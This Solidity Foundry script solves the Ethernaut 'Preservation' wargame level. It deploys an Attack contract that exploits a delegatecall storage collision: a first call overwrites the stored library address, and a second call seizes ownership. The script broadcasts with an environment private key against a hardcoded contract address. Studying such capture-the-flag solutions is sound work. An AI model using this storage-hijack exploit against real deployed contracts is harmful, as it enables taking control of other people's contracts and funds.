// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "../src/Level16.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


contract Attack{

      address public timeZone1Library;
      address public timeZone2Library;
      address public owner; 
    
    function exploit () external{

          Preservation instance = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);
        //updating the timeZone1Library with attack contract address
          instance.setFirstTime(uint(uint160(address(this))));
          /*
          when we call agian the setFirstTime f'n again , 
          it delegatecall to the attack contract and then results in changing the owner to msg.sender
           */
          
          instance.setFirstTime(uint(uint160(msg.sender)));
    }
    function setTime(uint _owner) external{

          owner = address(uint160(_owner));
    }


    }

contract Level16Sol is Script{

     
      function run() external{
            Preservation preservation = Preservation(0xA1979400E9bbCEcd6B13aA814281A6B95866A077);

            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
            Attack attack = new Attack();
            attack.exploit();

            vm.stopBroadcast();

    }
}